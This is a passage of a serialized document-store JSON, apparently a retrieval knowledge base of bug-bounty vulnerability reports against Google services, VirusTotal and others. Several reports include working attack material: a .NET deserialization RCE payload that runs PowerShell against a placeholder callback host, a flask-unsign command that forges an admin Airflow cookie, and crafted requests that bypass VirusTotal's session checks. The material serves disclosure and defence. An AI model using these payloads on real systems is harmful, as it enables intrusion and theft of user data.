"RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nAccess private user uploads via IDOR at androidenterprise.dev (including config files, passwords, emails, names, etc.)\r\nProduct:\r\nOther - Google VRP\r\nURL:\r\nhttps://www.androidenterprise.dev/s/contentdocument/{{insert_id}}\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nHello, Hope you are doing well. I wanted to report the following issues.\r\n1) There is an IDOR vulnerability at:\r\nthat allows any registered user to access another private user's files.\r\n2) There is also a vulnerability in the API that allows for the object called \"ContentDocument\" to be queried by any registered user. A malicious user can combine these two vulnerabilities (i.e. query the object, get the list of IDs, and call them using the above URL to access all private uploaded files on the site.\r\nThe documents available are specifically specified as private but are available if you query them directly on the site. For example, once you login, you can visit the below URLs to see other user files:\r\nhttps://www.androidenterprise.dev/s/contentdocument/[REDACTED_ID]\r\n- user uploaded json config file that includes network config info for the user. You can download it directly here:\r\nhttps://www.androidenterprise.dev/sfc/servlet.shepherd/document/download/[REDACTED_ID]?operationContext=S1\r\n- mp4 file of user interacting with their device\r\n- user account info\r\n- user imei numbers\r\n- user serial number, imei number, etc.\r\n- user stack track includes admin password on page 17\r\n- user case info\r\nFor each of these files, on the right side, you can see that they are only shared with one person (the owner of the file) so I should not have access to these and any random user definitely should not be able to access these. As all of these files (there are a lot of others) are user generated, the content varies and can be completely different depending on what the user has uploaded.\r\nThe ID of every user file is available to enumerate via the API via the ContentDocument object, so a malicious user can just iterate through them to download all private user files on the site.\r\nAttack scenario\r\nAny registered user can exploit this and access another user's private information. This includes:\r\nConfig information\r\nStack traces\r\nVideos of users showing issues with their devices\r\nOther user info/passwords for their networks\r\nEmails and names etc.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2348, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4f8b7897-4174-4bce-b883-51d6ed08d4e9": {"__data__": {"id_": "4f8b7897-4174-4bce-b883-51d6ed08d4e9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.clean.txt", "file_name": "20250408_175658_865168.clean.txt", "file_type": "text/plain", "file_size": 1305, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "91d451d9-dbcd-4726-9c4e-61fdc528a654", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.clean.txt", "file_name": "20250408_175658_865168.clean.txt", "file_type": "text/plain", "file_size": 1305, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c43597275fe3ff6c5ab9d1e2f6743a8886bfdbeae35a53af832132b1888e4d59", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSubDomain Takeover\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nhttps://brightbytes.net\r\nURL:\r\nhttps://sdmc.proxy.staging.clarity.brightbytes.net/\r\nVulnerability type:\r\nOther\r\nDetails\r\nHello,\r\nthis is pretty serious security issue in some context, so please act as fast as possible.\r\nOverview:\r\nOne of the brightbytes.net subdomains is pointing to heroku, which has unclaimed CNAME record. ANYONE is able to own brightbytes.net subdomain at the moment.\r\nThis vulnerability is called subdomain takeover. You can read more about it here:\r\nhttps://blog.sweepatic.com/subdomain-takeover-principles/\r\nhttps://hackerone.com/reports/32825\r\nhttps://hackerone.com/reports/175070\r\nhttps://hackerone.com/reports/172137\r\nDetails:\r\nsdmc.proxy.staging.clarity.brightbytes.net has cname  shrouded-caverns-8102.pure-basin-7604.herokuspace.com however it  is not registered in Heroku anymore and thus can be registered by anyone. After registering the Cloud App in the person doing so has full control over content on sdmc.proxy.staging.clarity.brightbytes.net\r\nMitigation:\r\nRemove the CNAME record from starbucks.com DNS zone completely.\r\nClaim it back in Azure portal after I release it\r\nRegards,\r\n[REDACTED_USERNAME]\r\nAttack scenario\r\nANYONE is able to own brightbytes.net subdomain at the moment.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1305, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f3a8e044-e7dd-4fe3-a6c0-d204a62b5ca7": {"__data__": {"id_": "f3a8e044-e7dd-4fe3-a6c0-d204a62b5ca7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.clean.txt", "file_name": "20250408_175703_529990.clean.txt", "file_type": "text/plain", "file_size": 4470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "89e3ffb3-8ca1-42e7-9a0c-a0814024c1e4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.clean.txt", "file_name": "20250408_175703_529990.clean.txt", "file_type": "text/plain", "file_size": 4470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d98a038c87cf4548ebd7aff33b7bf103a218ff05bbf398f037509bfeaf0de931", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nUser isolation bypass due to confused deputy in Google Play Services\r\nProduct:\r\nGoogle Play\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nThis issue exists in the Google Play Services Android app. (\r\ncom.google.android.gms\r\n) hereafter referred to as GMS. The issue manifests when trying to select a Google account profile photo through Google account settings. It likely exists in\r\ncom.google.android.gms.people.profile.AvatarActivity\r\n, though I can't be sure about this due to the obfuscation used in the app.\r\nAn abridged description of what happens whenever a user tries to pick a photo for their Google account:\r\nGMS gives them an option to either take a photo or choose a photo.\r\nIf the user elects to choose an image, it starts an intent with\r\nACTION_PICK\r\n.\r\nAn app chooser is shown to the user containing every app that can handle this action.\r\nThe app chosen by the user returns (with\r\nsetResult\r\n) an Intent containing a URI in its data field.\r\nGMS reads an image from this URI, and shows the user a crop menu containing the image.\r\nFinally, GMS sets the cropped image as the profile photo.\r\nThis gives rise to a classic confused deputy issue, because in step 5, the image is being read with GMS's own permissions. GMS is one of the most privileged apps that come with an Android device, and as such, it also has the\r\nINTERACT_ACROSS_USERS\r\npermission.\r\nTo exploit this, we can use an undocumented behavior in Android which allows us to create URIs that point to resources belonging to other users - prepending the target user ID to the URI authority followed by an @ symbol. As an example:\r\nNormal media URI:\r\ncontent://media/external/images/media/[x]\r\n2nd user's media URI:\r\ncontent://10@media/external/images/media/[x]\r\nTherefore, if a user creates an app that receives GMS's\r\nIntent and returns a URI pointing to an arbitrary image that belongs to another user, GMS will use its own superior privileges to read this image and display it on a cropping menu.\r\nAttack scenario\r\nA malicious user can use this issue to read private image files belonging to other users of the device. This includes any image file in the victim user's storage space, the victim user's contact photos, and more. (generally any type of image file that GMS itself can access - which likely encompasses almost every image file in the device) Admin privileges are not required, and normal users can read images belonging to admin users as well.\r\nThis can likely be used to also read images from other profiles in enterprise devices, though at this moment I have no way of testing this.\r\nThis is a security issue since Android's security principles mandate a complete isolation between users and profiles, other than a few specific exceptions of non-personal data. (e.g., app updates and system configurations) For instance, such issues in AOSP apps are\r\nconsidered high-severity\r\nThe attached app reads media files from an arbitrary user. I reproduced the issue in the latest public GMS version (22.43.12) in a Pixel 6 device. To reproduce the issue:\r\nSwitch to the target user and take some photos. (you can also just copy some images in)\r\nSwitch to the attacker user and install the attached app. Don't launch it yet.\r\nNavigate to Settings -> Google -> Manage your Google Account -> [Profile Photo Circle] -> Set Profile Photo -> Choose photo -> GMS Profile Photo Exploit.\r\nEnter the target user ID and the target media ID.\r\nThe primary user has an ID of 0. Secondary user IDs in Android are assigned sequentially starting from 10. IDs 1-9 are unused.\r\nMedia IDs are assigned sequentially starting from somewhere around 1000000010. If the target is the main user, you can speed up the process for testing by running\r\nadb shell content://media/external/images/media\r\nand then looking for the\r\n_id\r\nfield. (though an actual attacker can't do this)\r\nYou (and an actual attacker) can also brute-force the media ID by just trying numbers starting from 1000000010 in ascending order. You'll likely hit a valid value after less than 20 tries.\r\nPress \"Done\". You should see a photo from step 1 in a cropping menu - if not, please retry step 4 with a different media ID.\r\nTo fix this issue, I recommed restricting this particular Intent to the system image picker. This can be done by using\r\nqueryIntentActivities\r\nwith\r\nMATCH_SYSTEM_ONLY\r\nto determine the system picker in a device-agnostic manner, and then using\r\nsetPackage\r\nto restrict the Intent prior to starting.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4470, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4e356059-6b68-4d48-99b8-a0c297e786da": {"__data__": {"id_": "4e356059-6b68-4d48-99b8-a0c297e786da", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bff45020-2884-4541-a325-5865a192e7e3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "63620fd7b03ad047097f44890e18de6ae42c6d9a3ba46a6b8c356bcedf5c0e25", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "a146f45d-73c3-4a49-b558-d1cb47d03bcb", "node_type": "1", "metadata": {}, "hash": "da5e4378527bf87e61cad1285736b01c17b81485918ea59299c9cbf4e6489ee8", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Ability to delete GCR repositories from a project, from a node without the scopes to do it.\r\nA copy of the report (130287976) to change the reporter e-mail.\r\n---------------------------------------------------------------------- CASE SUBJECT ----------------------------------------------------------------------\r\nGCR API allows r/w bucket access for an IAM service account in a GKE container process, while Cloud Storage API should deny it for that account, according to GKE node's OAuth scope\r\n---------------------------------------------------------------------- CASE DESCRIPTION ----------------------------------------------------------------------\r\nWe observe a possible bucket access issue via GCR API. Here's an example in details:\r\nThe project's \"Compute Engine default service account\" (\r\n168590553477-compute@developer.gserviceaccount.com\r\nin this case) has an \"Editor\" role in IAM.\r\nGKE Kubernetes cluster nodes in that project are created using this very \"Compute Engine default service account\".\r\nWe limit the GKE node's OAuth scopes to the following 6 only:\r\nhttps://www.googleapis.com/auth/devstorage.read_only\r\nhttps://www.googleapis.com/auth/monitoring\r\nhttps://www.googleapis.com/auth/logging.write\r\nhttps://www.googleapis.com/auth/service.management.readonly\r\nhttps://www.googleapis.com/auth/servicecontrol\r\nhttps://www.googleapis.com/auth/trace.append\r\nIn that same project we have a GCR bucket, with access rights as follows:\r\n$ gsutil iam get gs://artifacts.egnyteprotect-automation.appspot.com\r\n{\r\n\"bindings\": [\r\n\"members\": [\r\n\"projectEditor:egnyteprotect-automation\",\r\n\"projectOwner:egnyteprotect-automation\"\r\n],\r\n\"role\": \"roles/storage.legacyBucketOwner\"\r\n},\r\n\"projectViewer:egnyteprotect-automation\"\r\n\"role\": \"roles/storage.legacyBucketReader\"\r\n}\r\n\"etag\": \"CAE=\"\r\nIn spite of read-only Cloud Storage API access, set as per the node's OAuth scopes above, the \"Compute Engine default service account\" grants read-write bucket access via GCR API for processes in a GKE container - as with the following\r\ngcloud container images delete\r\ncommand ran in a GKE container:\r\ngcloud --format=yaml auth list\r\n---\r\naccount: 168590553477-compute@developer.gserviceaccount.com\r\nstatus: ACTIVE\r\ngcloud container images delete --quiet --force-delete-tags gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT\r\nDigests:\r\n- gcr.io/egnyteprotect-automation/business-analysis-sql-slurper@sha256:3238d6603af4e7229a41dcb6abfc8bbf50ecfe4e2236de52c7e86f451e3cd599\r\nAssociated tags:\r\n- 0.0.1-SNAPSHOT\r\nTags:\r\n- gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT\r\nDeleted [gcr.io/egnyteprotect-automation/business-analysis-sql-slurper:0.0.1-SNAPSHOT].\r\nDeleted [gcr.io/egnyteprotect-automation/business-analysis-sql-slurper@sha256:3238d6603af4e7229a41dcb6abfc8bbf50ecfe4e2236de52c7e86f451e3cd599].\r\nSo it seems that the GCR bucket's \"projectEditor:egnyteprotect-automation\" \"roles/storage.legacyBucketOwner\" binding takes precedence over the \"devstorage.read_only\" GKE node's OAuth scope for processes in a GKE container. But, a GCR bucket is still also a Cloud Storage bucket, so I'd rather expect a container process which tries to access a GCR bucket, no matter if that's via Cloud Storage or GCR API, to be limited by the Cloud Storage OAuth scope set on a GKE node. Am I missing something?\r\n---------------------------------------------------------------------- /CASE DESCRIPTION ----------------------------------------------------------------------\r\nThe way to achieve this is:\r\n---------------------------------------------------------------------- REPRODUCTION STEPS ----------------------------------------------------------------------\r\n1 - Create GKE cluster\r\ngcloud container clusters create testcluster-scoped --zone europe-west2-c --scopes=gke-default\r\nWhere the scopes are set to the same as the customer tags. The cluster uses the default service account for Compute, which by default has Editor role.\r\n2 - Create test GCR repository.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4011, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a146f45d-73c3-4a49-b558-d1cb47d03bcb": {"__data__": {"id_": "a146f45d-73c3-4a49-b558-d1cb47d03bcb", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bff45020-2884-4541-a325-5865a192e7e3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "63620fd7b03ad047097f44890e18de6ae42c6d9a3ba46a6b8c356bcedf5c0e25", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "4e356059-6b68-4d48-99b8-a0c297e786da", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2828c8fba6a36b24a988d4cd2af65120981d4ce548ceb33be8d022ae822cb831", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "But, a GCR bucket is still also a Cloud Storage bucket, so I'd rather expect a container process which tries to access a GCR bucket, no matter if that's via Cloud Storage or GCR API, to be limited by the Cloud Storage OAuth scope set on a GKE node. Am I missing something?\r\n---------------------------------------------------------------------- /CASE DESCRIPTION ----------------------------------------------------------------------\r\nThe way to achieve this is:\r\n---------------------------------------------------------------------- REPRODUCTION STEPS ----------------------------------------------------------------------\r\n1 - Create GKE cluster\r\ngcloud container clusters create testcluster-scoped --zone europe-west2-c --scopes=gke-default\r\nWhere the scopes are set to the same as the customer tags. The cluster uses the default service account for Compute, which by default has Editor role.\r\n2 - Create test GCR repository. For example:\r\neu.gcr.io/<project-name>/<repo-name>\r\nBindings should be like this:\r\n\"projectEditor:ideas-justme\",\r\n\"projectOwner:ideas-justme\"\r\n\"projectViewer:ideas-justme\"\r\n3 - Open node(COS) with SSH and use /usr/bin/toolbox to run:\r\ngcloud container images delete --quiet --force-delete-tags eu.gcr.io/ideas-justme/simple-nginx-test\r\nOutput should be like:\r\n[...]\r\nDeleted [eu.gcr.io/ideas-justme/simple-nginx-test:latest].\r\nDeleted [eu.gcr.io/ideas-justme/simple-nginx-test@sha256:76e80f9fef1b09988c1482178c34acafce9f7fe73d5ba097a6fc75ef9b990be5].\r\nExtra: This also can be done directly from an Ubuntu-based cluster (without using /usr/bin/toolbox)\r\n---------------------------------------------------------------------- /REPRODUCTION STEPS ----------------------------------------------------------------------", "mimetype": "text/plain", "start_char_idx": 3082, "end_char_idx": 4826, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e318e902-c827-48b9-a4c1-187b4fac1541": {"__data__": {"id_": "e318e902-c827-48b9-a4c1-187b4fac1541", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.clean.txt", "file_name": "20250408_175647_450260.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "752e327f-2c13-483b-935a-33135d032139", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.clean.txt", "file_name": "20250408_175647_450260.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d1237cfae33512b0068388eceba1a3b4f0aabbcb2074cb6d9ad002fd5d0237db", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b124fef2-8ad3-4b77-87d3-ab633da63d92": {"__data__": {"id_": "b124fef2-8ad3-4b77-87d3-ab633da63d92", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.clean.txt", "file_name": "20250408_175708_228658.clean.txt", "file_type": "text/plain", "file_size": 3038, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ced43e07-df1b-4fee-8f76-5456553cfee5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.clean.txt", "file_name": "20250408_175708_228658.clean.txt", "file_type": "text/plain", "file_size": 3038, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8171a94fea2fa4b7cd5bd6334fc671965fc42f3f0fddedf34b6e6f525021664d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nPrivilege escalation in Airflow created by GCP Composer due to hardcoded secret_key\r\nProduct:\r\nGoogle Cloud\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nWhen a new\r\nComposer environment\r\nis generated in Composer, the\r\nsame secret_key is always used: \"some-random-id\"\r\n.\r\nThe name already indicates that the key\r\nshould be something random\r\n, but it's actually the string \"some-random-id\". I also couldn't find any documentation about this secret key used by Composer, nor any place where it's indicated that it should be changed or how to change it.\r\nThis key is actually the\r\nsecret used by flaks to sign the auth cookies\r\nThis means that\r\nanyone with access to the Apache Airflow\r\ninstance generated by Composer will be able to impersonate any other user. So for example, someone with\r\nViewer\r\naccess (this role doesn't doesn't even grant view access over the configuration) is going to be able to *\r\nsign a valid cookie with a different user_id *\r\nwith more privileges to escalate privileges.\r\nNote that the\r\nCVE-2020-17526 is similar\r\nto this vulnerability, the only difference is that GCP instead of using the default Airflow password has\r\nhardcoded its own one\r\nThe only thing preventing this from being a\r\ncomplete Take Over of all the Apache Airflow environments\r\ncreated by Composer is the fact that GCP first checks if the GCP user has access to the environment. Please, let me know if I'm wrong in the previous sentence, as if it's possible for a GCP unauthenticated user to access the Apache Airflow web consoles, he will be potentially able to compromise them knowing this secret.\r\nAttack scenario\r\nFor example, let's suppose there is a user with View access to an Apache Airflow instance created by Composer. This privilege might have been given to the user with:\r\ngcloud composer environments run <airflow-env> \\\r\n--location us-central1 users create -- \\\r\n-u accounts.google.com:<user-account> \\\r\n-e somestring \\\r\n-f somestring \\\r\n-l - -r Viewer --use-random-password\r\nNow, when that user log-in his\r\nvisibility is going to be be very limited\r\n(he cannot even see the config).\r\nHowever, the\r\nuser knows that the flask secret key is \"some-random-id\".\r\nSo, he can craft a new cookie with the user_id \"1\" (as it's potentially the most privileged one):\r\nflask-unsign --sign --secret 'some-random-id' --cookie \"{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}\"\r\nUsing the cookie generated by the previous code the viewer user will impersonate the user with id \"1\" effectively escalating privileges.\r\nThe previous example was explained with a user with role Viewer, but this issue can be\r\nexploited with any other role, including Public role\r\n(which is a role that doesn't grant any type of permission over the Airflow console).\r\n-l - -r Public --use-random-password", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3038, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "30392187-b0bf-4145-844b-7c909df725db": {"__data__": {"id_": "30392187-b0bf-4145-844b-7c909df725db", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.clean.txt", "file_name": "20250408_175705_797358.clean.txt", "file_type": "text/plain", "file_size": 1464, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b07dc340-c0c5-4747-a58d-a102f6c7acc3", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.clean.txt", "file_name": "20250408_175705_797358.clean.txt", "file_type": "text/plain", "file_size": 1464, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "0852f56d65e88aa838719ed2d67ccd74d84ae0b30565cec2691a80b30e266111", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nDeserialization RCE in AppSheet\r\nProduct:\r\nAppSheet\r\nURL:\r\nhttps://www.appsheet.com\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nIn the Automation section of AppSheet, it is possible to create a custom bot that can call the webhook located on the URL specified by the user (HTTP request). It is also possible to provide custom body data for this request and it is unsafely deserialized by the application.\r\nPOC\r\n: create a monthly scheduled bot with a step that will call webhook making HTTP POST request on any URL with this body (also in attached\r\npayload.txt\r\nfile), replacing\r\nyour_http_server_domain\r\nwith yours:\r\n{'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','MethodName':'Start','MethodParameters':{'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089','$values':[**'cmd', '/c powershell -command \"Invoke-WebRequest -URI your_http_server_domain\"'**]},'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}}\r\nYou will see in the server's logs the request was triggered by PowerShell code executed on the AppSheet server.\r\nAlso, you can see successful exploitation on the attached video\r\nAppSheet_Decerialization_RCE.mp4\r\n.\r\nAttack scenario\r\nAny remote attacker can achieve RCE in Google infrastructure", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1464, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "46b625e7-6999-4cc6-9127-d8ae1d97e378": {"__data__": {"id_": "46b625e7-6999-4cc6-9127-d8ae1d97e378", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.clean.txt", "file_name": "20250408_175708_024120.clean.txt", "file_type": "text/plain", "file_size": 3412, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5235e34c-35db-4f64-acf7-aa8564dde543", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.clean.txt", "file_name": "20250408_175708_024120.clean.txt", "file_type": "text/plain", "file_size": 3412, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "98854813d4529a807143c0a2631e317bb1e353ee39ccf67adb60fc8dd757f321", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nThe bug in VirusTotal's sessions handle mechanism allows to get access to any user account\r\nProduct:\r\nhttps://www.virustotal.com/\r\nVulnerability type:\r\nAuth Bypass\r\nDetails\r\nIn order to perform exploitation of the bug an attacker needs VT account, say [REDACTED_EMAIL]. After logging he obtains the\r\nVT_SESSION_ID\r\ncookie:\r\n[REDACTED]\r\nDecode it using base64:\r\n[REDACTED]||1657472422||e39901b640019bfe33dfd0f4a6920bf7af4468cb82c415bb0d8baecce9f1a36Yg\r\n.\r\nSeems, it has format\r\nb64_serialized_string||timestamp||control_hashsum\r\nLet's see at the\r\nb64_serialized_string\r\nof another user with email [REDACTED_EMAIL]:\r\nIf you decode these\r\n's (add\r\n=\r\nto the end of the strings before decoding) and compare it, you will see that they differ only in four bytes (see serialized_string_compare.png). I also saw cases, where were 5 distinct bytes.\r\nSo, an attacker can bruteforce these 4-5 bytes in order to get valid\r\n's. The problem is that an attacker needs to construct a valid\r\n. It is possible with the user registration mechanism.\r\nImagine, that an attacker brutrforced\r\n.  He can create new user with any email and username =\r\n.  I did it using account with email\r\n[REDACTED_EMAIL]\r\n(account_creation.PNG).\r\nLook at the confirmation link was sent to email:\r\nhttps://www.virustotal.com/gui/account-activation/[REDACTED]\r\nDecode it with base64:\r\n[REDACTED]||1657473711||a29ee9e51846b45733518ba6b2a97c88cf97e2b5fad5b8123cabc3e5ecd385fNw\r\nYou can see our tampered\r\nwith the same format as\r\nand with a valid sign.\r\nTo check if this obtained\r\nis tied to any user session an attacker can perform this request:\r\nGET /ui/user_notifications HTTP/2\r\nHost: www.virustotal.com\r\nCookie: VT_SESSION_ID=[REDACTED]\r\nX-Vt-Anti-Abuse-Header: 0\r\nUser-Agent: 0\r\nAccept-Ianguage: 0\r\nX-Tool: 0\r\nReferer: http://127.0.0.1\r\nUsing provided headers it is possible to skip checks of\r\nVT_SESSION_HASH\r\ncookie and\r\nX-Session-Hash\r\n,\r\nX-Vt-Anti-Abuse-Header\r\nheaders. The interesting thing is that behavior depends on the\r\nReferrer\r\nheader.\r\nIf the request is succeeded, in response you can see links with the username ([REDACTED_USERNAME]):\r\n\"links\": {\r\n\"self\": \"\r\nhttps://www.virustotal.com/ui/users/[REDACTED_USERNAME]/notifications?limit=10\"\r\n\"next\": \"\r\nhttps://www.virustotal.com/ui/users/[REDACTED_USERNAME]1notifications?cursor=CjsSNWoRc352aXJ1c3RvdGFsY2xvdWRyIAsSEFVzZXJOb3RpZmljYXRpb24iCjIwMjAxMTI2MDEMGAAgAQ%3D%3D&limit=10\"\r\n}\r\nAnd finally, an attacker can perform this request to obtain secret user data (access token):\r\nGET /ui/users/[REDACTED_USERNAME] HTTP/2\r\n{\r\n\"data\": {\r\n\"attributes\": 